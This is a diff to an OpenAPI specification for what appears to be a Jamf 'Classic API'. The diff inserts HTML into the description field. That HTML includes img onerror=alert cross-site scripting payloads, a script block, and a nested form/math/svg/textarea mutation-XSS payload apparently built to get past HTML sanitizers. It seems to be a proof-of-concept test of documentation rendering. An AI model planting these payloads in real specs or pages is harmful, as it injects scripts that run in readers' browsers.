@@ -3,11 +3,14 @@ info:
   title: Classic API Resource Documentation
   description: |
     
+        <form>
         <div>
             <img onerror=alert('aaaaaaaa') src=1>
            
         </div>
+        </form>
         
+        <form>
         <div id="content">
             <script type="text/javascript">
                 function myFunction() {
@@ -17,6 +20,9 @@ info:
                 myFunction();
             </script>
         </div>
+        </form>
+        
+        <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert('nnnnnnnnnnnnn') src=1>"></form>
         
   version: production
 basePath: /JSSResource/
